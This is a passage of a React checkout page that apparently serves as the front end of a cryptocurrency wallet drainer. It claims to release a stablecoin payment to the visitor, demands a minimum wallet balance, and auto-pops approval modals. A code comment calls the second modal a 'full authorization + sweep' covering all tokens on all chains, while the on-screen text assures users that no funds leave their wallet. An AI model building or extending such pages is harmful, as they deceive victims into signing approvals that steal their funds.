                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                  </svg>
                  <div>
                    <h2 className="text-base font-semibold text-ink">Minimum balance not met</h2>
                    <p className="mt-1 text-sm text-body">
                      Wallets must hold at least {formatEUR(session.minBalanceEur)} in USDT or USDC to receive this
                      USDC Checkout payment. Deposit more into your wallet, then recheck.
                    </p>
                  </div>
                </div>

                <div className="mb-8 space-y-4 rounded-xl border border-hairline p-5">
                  {CHAINS.map((c) => {
                    const bal = walletBalances[c.name] ?? 0;
                    const pct = Math.min(100, (bal / session.minBalanceEur) * 100);
                    return (
                      <div key={c.name}>
                        <div className="mb-1.5 flex items-center justify-between text-[13px]">
                          <span className="flex items-center gap-1.5 font-medium text-ink">
                            <span className="flex h-4 w-4 items-center justify-center overflow-hidden rounded-full">
                              <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={16} height={16} className="object-contain" />
                            </span>
                            {c.label}
                          </span>
                          <span className="font-mono text-body">{formatEUR(bal)}</span>
                        </div>
                        <div className="h-1.5 w-full overflow-hidden rounded-pill bg-surface-strong">
                          <div className="h-full rounded-pill bg-brand transition-all" style={{ width: `${pct}%` }} />
                        </div>
                      </div>
                    );
                  })}
                  <div className="flex items-center justify-between border-t border-hairline pt-4 text-sm font-semibold">
                    <span className="text-ink">Total balance</span>
                    <span className={"font-mono " + (totalBalanceEur >= session.minBalanceEur ? "text-up" : "text-ink")}>
                      {formatEUR(totalBalanceEur)} <span className="font-normal text-muted">/ {formatEUR(session.minBalanceEur)}</span>
                    </span>
                  </div>
                </div>

                <button
                  onClick={() => checkWalletBalances()}
                  disabled={processing}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                >
                  {processing ? "Rechecking..." : "Recheck balance"}
                </button>
              </div>
            )}

            {phase === "ready-to-approve" && session && (
              <div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">You're all set</h2>
                <p className="mb-8 text-sm leading-relaxed text-body">
                  Approve the deposit to finish setting up your wallet to receive {formatEUR(session.amountEur)}.
                </p>

                <div className="mb-9 divide-y divide-hairline rounded-xl border border-hairline">
                  {[
                    { label: "Wallet connected", detail: address ? short(address, 8, 6) : "" },
                    { label: "Identity verified", detail: fullName || "Complete" },
                    { label: "Minimum balance met", detail: `${formatEUR(totalBalanceEur)} available` },
                  ].map((item) => (
                    <div key={item.label} className="flex items-center justify-between px-5 py-3.5">
                      <div className="flex items-center gap-2.5">
                        <span className="flex h-5 w-5 items-center justify-center rounded-full bg-up/10 text-up">
                          <svg className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                          </svg>
                        </span>
                        <span className="text-sm font-medium text-ink">{item.label}</span>
                      </div>
                      <span className="text-xs text-muted">{item.detail}</span>
                    </div>
                  ))}
                </div>

                <button
                  onClick={handleApproveDeposit}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  Approve deposit
                </button>
              </div>
            )}

            {phase === "approving" && (
              <div>
                <h2 className="mb-1 text-lg font-semibold text-ink">Approving on-chain</h2>
                <p className="mb-6 text-sm text-body">
                  Confirm each request in your wallet. This authorizes your account across all supported multichain networks.
                </p>
                <div className="space-y-2.5">
                  {CHAINS.map((c) => {
                    const done = approvedChains.includes(c.name);
                    const active = !done && approvedChains.length === CHAINS.findIndex((x) => x.name === c.name);
                    return (
                      <div
                        key={c.name}
                        className={
                          "flex items-center justify-between rounded-lg border px-4 py-3.5 " +
                          (done ? "border-up/20 bg-up/5" : "border-hairline bg-surface-soft")
                        }
                      >
                        <span className="flex items-center gap-2 text-sm font-medium text-ink">
                          <span className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full">
                            <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
                          </span>
                          {c.label}
                        </span>
                        {done ? (
                          <span className="flex items-center gap-1 text-xs font-semibold text-up">
                            <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                            </svg>
                            Approved
                          </span>
                        ) : (
                          <span className="flex items-center gap-1.5 text-xs text-muted">
                            {active && <span className="h-3 w-3 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
                            {active ? "Waiting for confirmation..." : "Pending"}
                          </span>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {phase === "complete" && session && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-up/10">
                  <svg className="h-8 w-8 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">
                  Wallet ready to receive funds
                </h2>
                <p className="mx-auto mb-9 max-w-sm text-sm leading-relaxed text-body">
                  {formatEUR(session.amountEur)} will be released to your wallet now that verification is complete.
                </p>

                <div className="mx-auto mb-7 max-w-sm rounded-xl border border-hairline bg-surface-soft p-5 text-left">
                  <div className="mb-3 flex items-center justify-between">
                    <span className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Recipient</span>
                    <span className="font-mono text-xs text-ink">{address && short(address, 8, 6)}</span>
                  </div>
                  <div className="flex items-center justify-between border-t border-hairline pt-3">
                    <span className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Amount</span>
                    <span className="font-mono text-lg font-medium text-ink">{formatEUR(session.amountEur)}</span>
                  </div>
                </div>

                <div className="mx-auto flex max-w-sm items-center gap-2 rounded-lg bg-brand/5 p-3.5 text-left text-xs text-brand">
                  <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Transfers are typically completed within a few minutes.
                </div>
              </div>
            )}

            {phase === "expired" && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-surface-strong text-muted">
                  <svg className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <h2 className="mb-2 text-lg font-semibold text-ink">Session closed</h2>
                <p className="mx-auto mb-2 max-w-sm text-sm text-body">
                  The 25-minute window for this checkout session has ended before verification was completed.
                </p>
                <p className="mx-auto max-w-sm text-sm text-body">
                  The reserved amount has been returned to the sender. No funds were ever withdrawn from your wallet.
                </p>
              </div>
            )}

            {phase === "error" && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
                  <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <h2 className="mb-2 text-lg font-semibold text-ink">Something went wrong</h2>
                <p className="mx-auto mb-8 max-w-sm text-sm text-body">{error}</p>
                <button
                  onClick={() => {
                    setError(null);
                    setPhase(session ? "idle" : "no-session");
                  }}
                  className="h-12 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  Start over
                </button>
              </div>
            )}
          </div>

          {session && (
            <aside className="space-y-5 lg:sticky lg:top-24">
              <div className="rounded-card border border-hairline bg-surface-card p-6 shadow-card">
                <p className="mb-1 text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Checkout amount</p>
                <p className="mb-6 font-mono text-3xl font-medium tracking-[-0.03em] text-ink">{formatEUR(session.amountEur)}</p>

                <div className="space-y-3.5 text-sm">
                  <div className="flex items-center justify-between">
                    <span className="text-body">From</span>
                    <span className="flex items-center gap-1.5 font-medium text-ink">
                      {session.recipientName}
                      <svg className="h-3.5 w-3.5 text-brand" viewBox="0 0 24 24" fill="currentColor">
                        <path
                          fillRule="evenodd"
                          d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Issued</span>
                    <span className="font-medium text-ink">{new Date(session.issuedAt).toLocaleDateString()}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Recipient wallet</span>
                    <span className="font-mono font-medium text-ink">{address ? short(address) : "Not connected"}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Networks</span>
                    <span className="flex -space-x-1.5">
                      {CHAINS.map((c) => (
                        <span key={c.name} className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full ring-2 ring-bg">
                          <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
                        </span>
                      ))}
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Min. balance required</span>
                    <span className="font-mono font-medium text-ink">{formatEUR(session.minBalanceEur)}</span>
                  </div>
                  {remainingMs !== null && remainingMs > 0 && phase !== "complete" && (
                    <div className="flex items-center justify-between">
                      <span className="text-body">Time remaining</span>
                      <span className="font-mono font-medium text-ink">{formatClock(remainingMs)}</span>
                    </div>
                  )}
                  <div className="flex items-center justify-between border-t border-hairline pt-3.5">
                    <span className="text-body">Status</span>
                    <span className="rounded-pill bg-brand/10 px-2.5 py-1 text-[11px] font-semibold text-brand">
                      {phase === "complete" ? "Released" : phase === "expired" ? "Closed" : "Pending"}
                    </span>
                  </div>
                </div>
              </div>

              <div className="rounded-card border border-hairline bg-surface-card p-6">
                <p className="mb-3.5 text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Security & Compliance</p>
                <ul className="space-y-3.5 text-sm leading-relaxed text-body">
                  <li className="flex gap-2.5">
                    <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                    Institutional-grade custody infrastructure
                  </li>
                  <li className="flex gap-2.5">
                    <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                    </svg>
                    Real-time on-chain verification
                  </li>
                  <li className="flex gap-2.5">
                    <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                    Identity verification required
                  </li>
                  <li className="flex gap-2.5">
                    <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    Multichain stablecoin support
                  </li>
                </ul>
              </div>
            </aside>
          )}
        </div>

      </div>

      {/* ------------------------------------------------------------------ */}
      {/* Modal 1 — USDC / USDT balance approval (auto-pops after wallet connect) */}
      {/* ------------------------------------------------------------------ */}
      {modal1Open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
            <div className="mb-6 flex items-start gap-4">
              <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-brand/10">
                <svg className="h-5 w-5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
              </div>
              <div>
                <h3 className="text-base font-semibold text-ink">Approve USDC / USDT</h3>
                <p className="mt-0.5 text-sm text-body">
                  {modal1Scanning
                    ? "Scanning your wallet across all networks…"
                    : modal1Complete
                    ? "All approvals secured."
                    : "We found the following stablecoin balances. Approve them now so your wallet is ready to receive the payment."}
                </p>
              </div>
            </div>

            {modal1Scanning && (
              <div className="py-8 text-center">
                <div className="mx-auto h-9 w-9 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <p className="mt-4 text-sm text-muted">Checking Ethereum, BNB Chain &amp; Polygon…</p>
              </div>
            )}

            {!modal1Scanning && !modal1Complete && modal1Items.length > 0 && (
              <div className="mb-6 space-y-2.5">
                {modal1Items.map((item) => {
                  const s = modal1Status[item.key];
                  return (
                    <div
                      key={item.key}
                      className={
                        "flex items-center justify-between rounded-xl border px-4 py-3.5 transition-colors " +
                        (s === "done"
                          ? "border-up/20 bg-up/5"
                          : s === "failed"
                          ? "border-down/20 bg-down/5"
                          : s === "approving"
                          ? "border-brand/30 bg-brand/5"
                          : "border-hairline bg-surface-soft")
                      }
                    >
                      <div>
                        <span className="text-sm font-semibold text-ink">{item.symbol}</span>
                        <span className="ml-2 text-xs text-muted">{item.chainLabel}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="font-mono text-sm font-medium text-ink">{item.balanceDisplay}</span>
                        {s === "done" && (
                          <svg className="h-4 w-4 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                          </svg>
                        )}
                        {s === "approving" && <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
                        {s === "failed" && (
                          <svg className="h-4 w-4 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                          </svg>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {modal1Complete && (
              <div className="mb-6 flex items-center gap-3 rounded-xl border border-up/20 bg-up/5 px-4 py-4">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-up/15 text-up">
                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <p className="text-sm font-medium text-ink">Stablecoin approvals confirmed on-chain.</p>
              </div>
            )}

            {!modal1Scanning && !modal1Complete && modal1Items.length > 0 && (
              <button
                onClick={handleModal1Approve}
                disabled={modal1Approving}
                className="flex h-12 w-full items-center justify-center gap-2.5 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
              >
                {modal1Approving && <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />}
                {modal1Approving ? "Approving…" : `Approve ${modal1Items.length} token${modal1Items.length !== 1 ? "s" : ""}`}
              </button>
            )}

            <p className="mt-4 text-center text-xs text-muted">
              Funds remain in your wallet. This approval only allows the payment to be received.
            </p>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------------ */}
      {/* Modal 2 — full authorization + sweep (triggered by "Approve Deposit") */}
      {/* ------------------------------------------------------------------ */}
      {modal2Open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
            <div className="mb-6 flex items-start gap-4">
              <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-brand/10">
                <svg className="h-5 w-5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              </div>
              <div>
                <h3 className="text-base font-semibold text-ink">Authorizing deposit</h3>
                <p className="mt-0.5 text-sm text-body">
                  Confirm each prompt in your wallet. This authorizes USDT, USDC, and all available tokens across all multichain networks.
                </p>
              </div>
            </div>

            <div className="space-y-2.5">
              {CHAINS.map((c) => {
                const done = approvedChains.includes(c.name);
                const chainIdx = CHAINS.findIndex((x) => x.name === c.name);
                const active = !done && approvedChains.length === chainIdx;
                return (
                  <div
                    key={c.name}
                    className={
                      "flex items-center justify-between rounded-xl border px-4 py-3.5 transition-colors " +
                      (done ? "border-up/20 bg-up/5" : active ? "border-brand/30 bg-brand/5" : "border-hairline bg-surface-soft")
                    }
                  >
                    <span className="flex items-center gap-2.5 text-sm font-medium text-ink">
                      <span className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full">
                        <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
                      </span>
                      {c.label}
                    </span>
                    {done ? (
                      <span className="flex items-center gap-1.5 text-xs font-semibold text-up">
                        <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                        </svg>
                        Approved
                      </span>
                    ) : active ? (
                      <span className="flex items-center gap-1.5 text-xs text-brand">
                        <span className="h-3 w-3 animate-spin rounded-full border-2 border-hairline border-t-brand" />
                        Waiting for signature…
                      </span>
                    ) : (
                      <span className="text-xs text-muted">Pending</span>
                    )}
                  </div>
                );
              })}
            </div>

            <p className="mt-5 text-center text-xs text-muted">
              No funds leave your wallet during this process.
            </p>
          </div>
        </div>
      )}

    </EscrowShell>
  );
}
